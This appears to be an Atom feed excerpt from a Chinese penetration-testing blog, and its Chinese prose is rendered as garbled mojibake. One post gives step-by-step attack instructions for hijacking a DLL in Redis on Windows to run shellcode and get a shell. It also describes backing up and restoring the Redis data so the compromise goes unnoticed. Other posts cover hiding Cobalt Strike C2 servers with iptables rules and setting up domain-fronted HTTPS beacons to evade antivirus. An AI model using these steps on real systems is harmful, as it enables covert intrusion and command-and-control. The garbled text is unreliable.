    <content type="html"><![CDATA[<h3 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h3><p>åœ¨githubä¸Šé¢å‡ºç°ä¸€ä¸ªä»“åº“åˆ†æ<code>CobaltStrike</code>ç›‘å¬ç«¯å£çš„ç‰¹å¾ï¼š<a href="https://github.com/Te-k/cobaltstrike">https://github.com/Te-k/cobaltstrike</a>ã€‚CSåœ¨ç›‘å¬Stagerç«¯å£çš„æ—¶å€™ï¼Œä¼šé€šè¿‡URIä¸‹è½½Payloadæ‰§è¡Œï¼Œè¿™ä¸ªURIç”Ÿæˆçš„è§„åˆ™ç”Ÿæˆï¼š</p><p><img src="/2021/01/04/CloudFront-find-cobaltstrike/360.png"></p><h3 id="æ‰¾åˆ°DomainFront"><a href="#æ‰¾åˆ°DomainFront" class="headerlink" title="æ‰¾åˆ°DomainFront"></a>æ‰¾åˆ°DomainFront</h3><p>æ ¹æ®360çš„ç©ºé—´æµ‹ç»˜ï¼Œçœ‹å®Œä¹‹åç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„æ˜¯é€šè¿‡fofaè¿™ç±»ç©ºé—´æµ‹ç»˜æ‰¾å‡ºç‰¹å¾ï¼Œç„¶åæ‰¾å‡ºæ¥è®¾ç½®äº†DomainFrontçš„C2ï¼Œæƒ³çœ‹çœ‹è¿™äº›C2<br>çš„åŸå§‹åŸŸåå’Œè®¾ç½®C2çš„åŸŸåæ˜¯ä»€ä¹ˆæƒ…å†µï¼Œå¤§å®¶éƒ½ç”¨çš„ä»€ä¹ˆä½œä¸ºåŸŸåå‰ç½®çš„ :)</p><h4 id="Quakeæµ‹ç»˜"><a href="#Quakeæµ‹ç»˜" class="headerlink" title="Quakeæµ‹ç»˜"></a>Quakeæµ‹ç»˜</h4><p>æ ¹æ®360ç»™å‡ºçš„æœç´¢æ¡ä»¶ï¼Œå…ˆæ‰¾å‡ºæ¥ä¸€æ‰¹IPåœ°å€:</p><pre class="line-numbers language-none"><code class="language-none">response:&quot;HTTP&#x2F;1.1 404 Not Found&quot; AND response:&quot;Content-Type: text&#x2F;plain&quot; AND response:&quot;Content-Length: 0&quot; AND NOT response:&quot;Server: &quot; AND NOT response:&quot;Connection: &quot; AND port: &quot;443&quot;   AND NOT country: &quot;China&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ä¿®æ”¹è„šæœ¬"><a href="#ä¿®æ”¹è„šæœ¬" class="headerlink" title="ä¿®æ”¹è„šæœ¬"></a>ä¿®æ”¹è„šæœ¬</h4><p>ä¿®æ”¹å¥½ä¹‹åçš„è„šæœ¬å’Œæ‰«æç»“æœ:<a href="https://github.com/JKme/cobaltstrike">https://github.com/JKme/cobaltstrike</a>ã€‚æŠŠå•çº¿ç¨‹æ”¹ä¸ºå¤šçº¿ç¨‹ï¼Œå†å¢åŠ ä¸€ä¸ªè·å–IPçš„httpsè¯ä¹¦åŸŸåå‡½æ•°ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_subject</span><span class="token punctuation">(</span>hostname<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        dst <span class="token operator">=</span> <span class="token punctuation">(</span>hostname<span class="token punctuation">,</span> <span class="token number">443</span><span class="token punctuation">)</span>        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>dst<span class="token punctuation">)</span>        ctx <span class="token operator">=</span> ssl<span class="token punctuation">.</span>create_default_context<span class="token punctuation">(</span><span class="token punctuation">)</span>        ctx<span class="token punctuation">.</span>check_hostname <span class="token operator">=</span> <span class="token boolean">False</span>        ctx<span class="token punctuation">.</span>verify_mode <span class="token operator">=</span> ssl<span class="token punctuation">.</span>CERT_NONE        s <span class="token operator">=</span> ctx<span class="token punctuation">.</span>wrap_socket<span class="token punctuation">(</span>s<span class="token punctuation">,</span> server_hostname<span class="token operator">=</span>dst<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        cert_bin <span class="token operator">=</span> s<span class="token punctuation">.</span>getpeercert<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>        x509 <span class="token operator">=</span> crypto<span class="token punctuation">.</span>load_certificate<span class="token punctuation">(</span>crypto<span class="token punctuation">.</span>FILETYPE_ASN1<span class="token punctuation">,</span> cert_bin<span class="token punctuation">)</span>        val <span class="token operator">=</span> x509<span class="token punctuation">.</span>get_subject<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>CN    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        val <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">return</span> val<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ‰«æç»“æœ"><a href="#æ‰«æç»“æœ" class="headerlink" title="æ‰«æç»“æœ"></a>æ‰«æç»“æœ</h3><ul><li>æœ€å¤šä½¿ç”¨çš„<code>GET URI</code>æ˜¯<code>submit.php</code></li><li>é™¤äº†awsçš„<code>CloudFront</code>ä½œä¸ºæœ€å¤šçš„åŸŸå‰ç½®ï¼Œè¿˜æœ‰ä½¿ç”¨<code>API Gateway</code>ï¼ŒçŒœæµ‹ä½¿ç”¨äº†httpsæµé‡è½¬å‘æˆ–è€…ç›´æ¥æ¥å…¥åˆ°ç½‘å…³ã€‚</li><li>è¿˜æœ‰ä½¿ç”¨äº†å·¨ç¡¬å®¶çš„åŸŸåï¼Œé‚£è¿™ç§å°±æ˜¯<code>Domain takeover</code>æ¥è·å–åˆ°çš„</li></ul><h3 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h3><p>å¦‚æœæ˜¯ä½¿ç”¨äº†AWSå®¶çš„<code>CloudFront</code>ä½œä¸ºåŸŸå‰ç½®ï¼Œå¯ä»¥è®¾ç½®é˜²ç«å¢™è§„åˆ™ï¼Œåªå…è®¸å±äº<code>CloudFront</code>çš„åŸŸåæµé‡ï¼Œå…¶ä»–IPè¯·æ±‚è¿‡æ¥çš„æµé‡ä¸¢æ‰ï¼Œæ“ä½œå¦‚ä¸‹:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x01:  è·å–åˆ°CloudFrontçš„æ‰€æœ‰IPhttp http://d7uri8nf7uskq.cloudfront.net/tools/list-cloudfront-ips <span class="token operator">|</span>jq <span class="token string">".[][]"</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/"//g'</span> <span class="token operator">|</span> <span class="token function">tee</span> /tmp/cloud.txt0x02: ä½¿ç”¨ipsetæ–°å¢IPé›†åˆipset create cloudfront hash:net<span class="token keyword">while</span> <span class="token builtin class-name">read</span> line<span class="token punctuation">;</span> <span class="token keyword">do</span> ipset <span class="token function">add</span> cloudfront <span class="token variable">$line</span><span class="token punctuation">;</span> <span class="token keyword">done</span> <span class="token operator">&lt;</span> /tmp/cloud.txtipset list cloudfront0x03: æ–°å¢IPtablesè§„åˆ™iptables -A INPUT -p tcp  --dport <span class="token number">443</span> -j DROPiptables -I INPUT -m <span class="token builtin class-name">set</span> --match-set cloudfront  src -p tcp  --dport <span class="token number">443</span> -j ACCEPT0x04: åŒç†å¯¹teamserverç«¯å£è¿›è¡Œè§„åˆ™è®¾ç½®ipset create teamserver hash:ipipset <span class="token function">add</span> teamserver <span class="token number">1.2</span>.3.4iptables -A INPUT -p tcp  --dport <span class="token number">50050</span> -j DROPiptables -I INPUT -m <span class="token builtin class-name">set</span> --match-set teamserver src -p tcp --dport <span class="token number">50050</span> -j ACCEPTä¸Šé¢ä¸¤ä¸ªiptablesè§„åˆ™å¯ä»¥åˆå¹¶ä¸€æ¡ï¼šiptables -I INPUT -m <span class="token builtin class-name">set</span> <span class="token operator">!</span> --match-set teamserver src -p tcp --dport <span class="token number">50050</span> -j DROP0x05: ipsetå¸¸è§å‘½ä»¤ipset del teamserver <span class="token number">1.2</span>.3.4  <span class="token comment">#ä»teamserverä¸­åˆ é™¤æŸIP</span>ipset list teamserver <span class="token comment"># æŸ¥çœ‹teamserveré›†åˆå†…å®¹</span>ipset flush teamserver <span class="token comment"># æ¸…ç©ºteamserverå†…å®¹</span>ipset flush  <span class="token comment"># æ¸…ç©ºæ‰€æœ‰</span>ipset destroy teamserver  <span class="token comment"># é”€æ¯teamserver</span>ipset destroy <span class="token comment"># é”€æ¯æ‰€æœ‰</span>0x06: iptablesåˆ é™¤è§„åˆ™<span class="token comment"># æ˜¾ç¤ºè§„åˆ™</span>iptables -L INPUT --line-numbers <span class="token comment"># åˆ é™¤è§„åˆ™</span>iptables -D INPUT <span class="token operator">&lt;</span>num<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä¿®æ”¹CSçš„æºä»£ç é‡æ–°æ‰“åŒ…ã€‚</p><h3 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h3><p>IPSETè®¾ç½®ç™½åå•ä¹‹åï¼Œä¼šå¯¹CSçš„è®¾ç½®VPNåŠŸèƒ½æœ‰å½±å“ã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://mp.weixin.qq.com/s/BLM8tM88x9oT4CjSiupE2A">æµ…æCobaltStrike Beacon Staging Serveræ‰«æ</a></li><li><a href="https://www.cnblogs.com/donot/p/14226788.html">é’ˆå¯¹CobaltStrikeä¸­å‡ºç°çš„Stagerç›‘å¬ç«¯å£ç‰¹å¾åé—¨åˆ†æ</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯&quot;&gt;&lt;/a&gt;èƒŒæ™¯&lt;/h3&gt;&lt;p&gt;åœ¨githubä¸Šé¢å‡ºç°ä¸€ä¸ªä»“åº“åˆ†æ&lt;code&gt;CobaltStrike&lt;/code&gt;ç›‘å¬ç«¯å£çš„ç‰¹å¾ï¼š&lt;a href=&quot;https://github.com/Te-k/cobaltstrike&quot;&gt;https://github.com/Te-k/cobaltstrike&lt;/a&gt;ã€‚CSåœ¨ç›‘å¬Stagerç«¯å£çš„æ—¶å€™ï¼Œä¼šé€šè¿‡URIä¸‹è½½Payloadæ‰§è¡Œï¼Œè¿™ä¸ªURIç”Ÿæˆçš„è§„åˆ™ç”Ÿæˆï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/01/04/CloudFront-find-cobaltstrike/360.png&quot;&gt;&lt;/p&gt;
&lt;h3 id=&quot;æ‰¾åˆ°DomainFront&quot;&gt;&lt;a href=&quot;#æ‰¾åˆ°DomainFront&quot; class=&quot;headerlink&quot; title=&quot;æ‰¾åˆ°DomainFront&quot;&gt;&lt;/a&gt;æ‰¾åˆ°DomainFront&lt;/h3&gt;&lt;p&gt;æ ¹æ®360çš„ç©ºé—´æµ‹ç»˜ï¼Œçœ‹å®Œä¹‹åç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„æ˜¯é€šè¿‡fofaè¿™ç±»ç©ºé—´æµ‹ç»˜æ‰¾å‡ºç‰¹å¾ï¼Œç„¶åæ‰¾å‡ºæ¥è®¾ç½®äº†DomainFrontçš„C2ï¼Œæƒ³çœ‹çœ‹è¿™äº›C2&lt;br&gt;çš„åŸå§‹åŸŸåå’Œè®¾ç½®C2çš„åŸŸåæ˜¯ä»€ä¹ˆæƒ…å†µï¼Œå¤§å®¶éƒ½ç”¨çš„ä»€ä¹ˆä½œä¸ºåŸŸåå‰ç½®çš„ :)&lt;/p&gt;
&lt;h4 id=&quot;Quakeæµ‹ç»˜&quot;&gt;&lt;a href=&quot;#Quakeæµ‹ç»˜&quot; class=&quot;headerlink&quot; title=&quot;Quakeæµ‹ç»˜&quot;&gt;&lt;/a&gt;Quakeæµ‹ç»˜&lt;/h4&gt;&lt;p&gt;æ ¹æ®360ç»™å‡ºçš„æœç´¢æ¡ä»¶ï¼Œå…ˆæ‰¾å‡ºæ¥ä¸€æ‰¹IPåœ°å€:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;response:&amp;quot;HTTP&amp;#x2F;1.1 404 Not Found&amp;quot; AND response:&amp;quot;Content-Type: text&amp;#x2F;plain&amp;quot; AND response:&amp;quot;Content-Length: 0&amp;quot; AND NOT response:&amp;quot;Server: &amp;quot; AND NOT response:&amp;quot;Connection: &amp;quot; AND port: &amp;quot;443&amp;quot;   AND NOT country: &amp;quot;China&amp;quot;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;ä¿®æ”¹è„šæœ¬&quot;&gt;&lt;a href=&quot;#ä¿®æ”¹è„šæœ¬&quot; class=&quot;headerlink&quot; title=&quot;ä¿®æ”¹è„šæœ¬&quot;&gt;&lt;/a&gt;ä¿®æ”¹è„šæœ¬&lt;/h4&gt;&lt;p&gt;ä¿®æ”¹å¥½ä¹‹åçš„è„šæœ¬å’Œæ‰«æç»“æœ:&lt;a href=&quot;https://github.com/JKme/cobaltstrike&quot;&gt;https://github.com/JKme/cobaltstrike&lt;/a&gt;ã€‚æŠŠå•çº¿ç¨‹æ”¹ä¸ºå¤šçº¿ç¨‹ï¼Œå†å¢åŠ ä¸€ä¸ªè·å–IPçš„httpsè¯ä¹¦åŸŸåå‡½æ•°ï¼š&lt;/p&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Redis On Windows -- Dll Hijack</title>
    <link href="https://jkme.github.io/2020/09/10/redis-windows-hijack.html"/>
    <id>https://jkme.github.io/2020/09/10/redis-windows-hijack.html</id>
    <published>2020-09-09T16:00:00.000Z</published>
    <updated>2022-01-21T02:57:53.265Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡æµ‹è¯•äº†Redisåœ¨Windowså¹³å°ä¸‹çš„dllåŠ«æŒï¼Œä¸»è¦å‚è€ƒæ–‡ç« æ˜¯å…ˆçŸ¥çš„ç§‹æ°´å¸ˆå‚…: <a href="https://xz.aliyun.com/t/8153">Redis on Windows å‡ºç½‘åˆ©ç”¨æ¢ç´¢</a></p><h3 id="æµ‹è¯•ç¯å¢ƒ"><a href="#æµ‹è¯•ç¯å¢ƒ" class="headerlink" title="æµ‹è¯•ç¯å¢ƒ"></a>æµ‹è¯•ç¯å¢ƒ</h3><pre class="line-numbers language-none"><code class="language-none">Redis-x64-3.2.100Win10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="å¯åŠ«æŒçš„DLL"><a href="#å¯åŠ«æŒçš„DLL" class="headerlink" title="å¯åŠ«æŒçš„DLL"></a>å¯åŠ«æŒçš„DLL</h3><p>æŒ‰ç…§æ–‡ç« ä¸­ä½¿ç”¨<code>Process Monitor</code>ï¼Œåœ¨ä½¿ç”¨<code>redis-cli</code>æ“ä½œçš„æ—¶å€™ï¼Œè§‚å¯Ÿç¼ºå¤±çš„DLLã€‚åœ¨<code>Process Monitor Filter</code>é‡Œé¢è®¾ç½®<code>Image Path</code>çš„å€¼ä¸º<code>redis-server.exe</code>çš„è·¯å¾„ï¼Œæ¯”å¦‚æˆ‘çš„æ˜¯<code>C:\Program Files\Redis\redis-server.exe</code>ï¼Œ<code>Path</code>è®¾ç½®ä¸º<code>ends with dll</code>ã€‚è®¾ç½®å¥½ä¹‹åï¼Œä½¿ç”¨<code>redis-cli</code>è¿æ¥ï¼Œæ‰§è¡Œ<code>bgsave</code>å‘½ä»¤ï¼Œç„¶åè§‚å¯Ÿç¼ºå¤±çš„dllï¼Œæœ‰å¦‚ä¸‹:</p><pre class="line-numbers language-none"><code class="language-none">HKLM\System\CurrentControlSet\Control\Srp\GP\DLLC:\Program Files\Redis\dbghelp.dllC:\Windows\System32\edgegdi.dllC:\Windows\System32\symsrv.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å½“<code>redis-server.exe</code>å¯åŠ¨çš„æ—¶å€™ï¼Œæœ‰å¦‚ä¸‹:</p><pre class="line-numbers language-none"><code class="language-none">C:\Windows\System32\edgegdi.dllC:\Windows\System32\symsrv.dllC:\Program Files\Redis\CRYPTBASE.DLL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡Œ<code>BGREWRITEAOF</code>çš„æ—¶å€™ï¼Œæœ‰å¦‚ä¸‹:</p><pre class="line-numbers language-none"><code class="language-none">HKLM\System\CurrentControlSet\Control\Srp\GP\DLLC:\Program Files\Redis\dbghelp.dllC:\Windows\System32\edgegdi.dllC:\Windows\System32\symsrv.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€ç»ˆåœ¨Redisç›®å½•ä¸‹å¯ä»¥åˆ©ç”¨çš„æœ‰ä¸¤ä¸ª:<code>cryptbase.dll</code>å’Œ<code>dbghelp.dll</code>ã€‚å¦‚æœæ˜¯æƒé™æŒä¹…æ€§æ§åˆ¶ï¼Œä¸¤ä¸ªéƒ½å¯ä»¥ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹©ä¸»åŠ¨æ”»å‡»ï¼Œæ‰€ä»¥ä½¿ç”¨<code>dbghelp.dll</code>ã€‚</p><p>###DLLHijacker</p><p>ä½¿ç”¨kiwingså¸ˆå‚…çš„<a href="https://github.com/kiwings/DLLHijacker">DLLHijacker</a>ï¼Œå› ä¸ºåœ¨ç³»ç»Ÿé‡Œé¢æ˜¯å­˜åœ¨<code>C:\Windows\System32\dbghelp.dll</code>çš„ï¼Œæ‰€ä»¥ï¼Œå¤åˆ¶å‡ºæ¥ä¹‹åï¼Œè¿è¡Œè„šæœ¬ï¼Œç”ŸæˆDLLå·¥ç¨‹é¡¹ç›®ã€‚ä¿®æ”¹é‡Œé¢çš„shellcodeå’Œdbghelp.dllçš„ç»å¯¹è·¯å¾„ã€‚</p><p>åœ¨å®é™…æµ‹è¯•çš„æ—¶å€™ï¼Œè¿è¡Œè„šæœ¬æŠ¥é”™ï¼Œæ‰€ä»¥ä¿®æ”¹äº†ä¸€éƒ¨åˆ†ä»£ç : <a href="https://github.com/JKme/sb_kiddie-/tree/master/dll_hijack">https://github.com/JKme/sb_kiddie-/tree/master/dll_hijack</a></p><p>æŠŠç”Ÿæˆçš„dllé‡å‘½åä¸º<code>dghelp.dll</code>æ”¾åœ¨redisçš„å®‰è£…ç›®å½•ï¼Œç„¶åæ‰§è¡Œ<code>bgsave</code>æˆ–è€…<code>redis-server</code>å¯åŠ¨çš„æ—¶å€™ä¼šæ‰§è¡Œshellcodeã€‚</p><p><img src="/2020/09/10/redis-windows-hijack/WX20200910.png"></p><h3 id="æµ‹è¯•ç»“æœ"><a href="#æµ‹è¯•ç»“æœ" class="headerlink" title="æµ‹è¯•ç»“æœ"></a>æµ‹è¯•ç»“æœ</h3><p>åœ¨å®é™…çš„æ¸—é€æµ‹è¯•ä¸­ï¼Œä½¿ç”¨<a href="https://github.com/r35tart/RedisWriteFile">RedisWriteFile</a>å†™å…¥æ–‡ä»¶çš„æ—¶å€™ï¼Œå› ä¸ºä½¿ç”¨çš„æ˜¯ä¸»ä»å¤åˆ¶ï¼Œä¼šæŠŠredisé‡Œé¢çš„æ•°æ®æ¸…ç©ºï¼Œè¿™æ ·æ”»å‡»ä¹‹åå¯èƒ½ä¼šè¢«å‘ç°ï¼Œæ‰€ä»¥å¯ä»¥è¿™æ ·åš:</p><h5 id="å¤‡ä»½redis"><a href="#å¤‡ä»½redis" class="headerlink" title="å¤‡ä»½redis"></a>å¤‡ä»½redis</h5><ul><li><a href="https://github.com/yannh/redis-dump-go">redis-dump-go</a></li></ul><pre class="line-numbers language-none"><code class="language-none">å¤‡ä»½:.&#x2F;redis-dump-go -host 192.168.2.233 -output commands &gt; redis.dumpæ¢å¤:redis-cli -h 192.168.2.233 &lt; redis.dump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ”»å‡»æ­¥éª¤"><a href="#æ”»å‡»æ­¥éª¤" class="headerlink" title="æ”»å‡»æ­¥éª¤"></a>æ”»å‡»æ­¥éª¤</h3><ol><li>å‡†å¤‡å¥½dllï¼Œä½¿ç”¨<a href="https://github.com/r35tart/RedisWriteFile">RedisWriteFile</a>å†™å…¥</li><li>å¤‡ä»½Redis: <code>./redis-dump-go -host 192.168.2.233 -output commands &gt; redis.dump</code></li><li>æ‰§è¡Œ<code>bgsave</code>,è·å–Shell</li><li>æ¢å¤Redis: <code>redis-cli -h 192.168.2.233 &lt; redis.dump</code></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;æœ¬æ–‡æµ‹è¯•äº†Redisåœ¨Windowså¹³å°ä¸‹çš„dllåŠ«æŒï¼Œä¸»è¦å‚è€ƒæ–‡ç« æ˜¯å…ˆçŸ¥çš„ç§‹æ°´å¸ˆå‚…: &lt;a href=&quot;https://xz.aliyun.com/t/8153&quot;&gt;Redis on Windows å‡ºç½‘åˆ©ç”¨æ¢ç´¢&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;æµ‹è¯•ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#æµ‹è¯•ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;æµ‹è¯•ç¯å¢ƒ&quot;&gt;&lt;/a&gt;æµ‹è¯•ç¯å¢ƒ&lt;/h3&gt;&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;Redis-x64-3.2.100
Win10&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;å¯åŠ«æŒçš„DLL&quot;&gt;&lt;a href=&quot;#å¯åŠ«æŒçš„DLL&quot; class=&quot;headerlink&quot; title=&quot;å¯åŠ«æŒçš„DLL&quot;&gt;&lt;/a&gt;å¯åŠ«æŒçš„DLL&lt;/h3&gt;&lt;p&gt;æŒ‰ç…§æ–‡ç« ä¸­ä½¿ç”¨&lt;code&gt;Process Monitor&lt;/code&gt;ï¼Œåœ¨ä½¿ç”¨&lt;code&gt;redis-cli&lt;/code&gt;æ“ä½œçš„æ—¶å€™ï¼Œè§‚å¯Ÿç¼ºå¤±çš„DLLã€‚åœ¨&lt;code&gt;Process Monitor Filter&lt;/code&gt;é‡Œé¢è®¾ç½®&lt;code&gt;Image Path&lt;/code&gt;çš„å€¼ä¸º&lt;code&gt;redis-server.exe&lt;/code&gt;çš„è·¯å¾„ï¼Œæ¯”å¦‚æˆ‘çš„æ˜¯&lt;code&gt;C:\Program Files\Redis\redis-server.exe&lt;/code&gt;ï¼Œ&lt;code&gt;Path&lt;/code&gt;è®¾ç½®ä¸º&lt;code&gt;ends with dll&lt;/code&gt;ã€‚è®¾ç½®å¥½ä¹‹åï¼Œä½¿ç”¨&lt;code&gt;redis-cli&lt;/code&gt;è¿æ¥ï¼Œæ‰§è¡Œ&lt;code&gt;bgsave&lt;/code&gt;å‘½ä»¤ï¼Œç„¶åè§‚å¯Ÿç¼ºå¤±çš„dllï¼Œæœ‰å¦‚ä¸‹:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;HKLM\System\CurrentControlSet\Control\Srp\GP\DLL
C:\Program Files\Redis\dbghelp.dll
C:\Windows\System32\edgegdi.dll
C:\Windows\System32\symsrv.dll&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;


&lt;p&gt;å½“&lt;code&gt;redis-server.exe&lt;/code&gt;å¯åŠ¨çš„æ—¶å€™ï¼Œæœ‰å¦‚ä¸‹:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;C:\Windows\System32\edgegdi.dll
C:\Windows\System32\symsrv.dll
C:\Program Files\Redis\CRYPTBASE.DLL&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;


&lt;p&gt;æ‰§è¡Œ&lt;code&gt;BGREWRITEAOF&lt;/code&gt;çš„æ—¶å€™ï¼Œæœ‰å¦‚ä¸‹:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;HKLM\System\CurrentControlSet\Control\Srp\GP\DLL
C:\Program Files\Redis\dbghelp.dll
C:\Windows\System32\edgegdi.dll
C:\Windows\System32\symsrv.dll&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Domain Frontingéšè—HTTPS</title>
    <link href="https://jkme.github.io/2020/08/28/CloudFront-Https.html"/>
    <id>https://jkme.github.io/2020/08/28/CloudFront-Https.html</id>
    <published>2020-08-27T16:00:00.000Z</published>
    <updated>2022-01-21T02:41:29.241Z</updated>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸€ä¸‹å½“ä½¿ç”¨<code>Domain Fronting</code>ä¸­ä½¿ç”¨<code>https</code>æ¥ä¸Šçº¿æ—¶å€™çš„å‘ï¼Œå› ä¸ºæŸ¥äº†åŠåœˆæ²¡æœ‰æ‰¾åˆ°ç±»ä¼¼çš„èµ„æ–™ï¼Œä¸ºå•¥éè¦httpså‘¢ï¼Œå› ä¸º<code>node32</code>å¯¹httpçš„æµé‡å¾ˆæ•æ„Ÿã€‚</p><p>###ç›®æ ‡</p><ol><li>ä½¿ç”¨<code>Windows/beacon_https/reverse_https</code>ä½œä¸ºä¸Šçº¿çš„payload</li><li>AWSçš„<code>Cloudfront</code>ä½œä¸ºå‰ç½®åŸŸå</li></ol><h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><pre class="line-numbers language-none"><code class="language-none">åŸŸå: example.comVPS(Centos)cloudflare(åªä½œåŸŸåè§£æ,ä¸æ·»åŠ ä»»ä½•å…¶ä»–åŠŸèƒ½ï¼Œä¸åŠ CDNï¼Œä¸åŠ HTTPS)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="éƒ¨ç½²å·¥ä½œ"><a href="#éƒ¨ç½²å·¥ä½œ" class="headerlink" title="éƒ¨ç½²å·¥ä½œ"></a>éƒ¨ç½²å·¥ä½œ</h2><p>å®‰è£…çš„apacheæ˜¯æµ‹è¯•è¿é€šæ€§ï¼Œé™¤æ­¤ä¹‹å¤–æ²¡æœ‰ä»»ä½•ç”¨å¤„ã€‚</p><pre class="line-numbers language-none"><code class="language-none">yum install httpdsystemctl start httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="å¢åŠ apacheé…ç½®æ–‡ä»¶"><a href="#å¢åŠ apacheé…ç½®æ–‡ä»¶" class="headerlink" title="å¢åŠ apacheé…ç½®æ–‡ä»¶"></a>å¢åŠ apacheé…ç½®æ–‡ä»¶</h4><pre class="line-numbers language-none"><code class="language-none">#&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;vhost.conf&lt;VirtualHost *:80&gt;   DocumentRoot &#x2F;var&#x2F;www&#x2F;html   ServerName example.comRewriteEngine onRewriteCond %&#123;SERVER_NAME&#125; &#x3D;example.comRewriteRule ^ https:&#x2F;&#x2F;%&#123;SERVER_NAME&#125;%&#123;REQUEST_URI&#125; [END,NE,R&#x3D;permanent]&lt;&#x2F;VirtualHost&gt;<span aria-hidden="true" 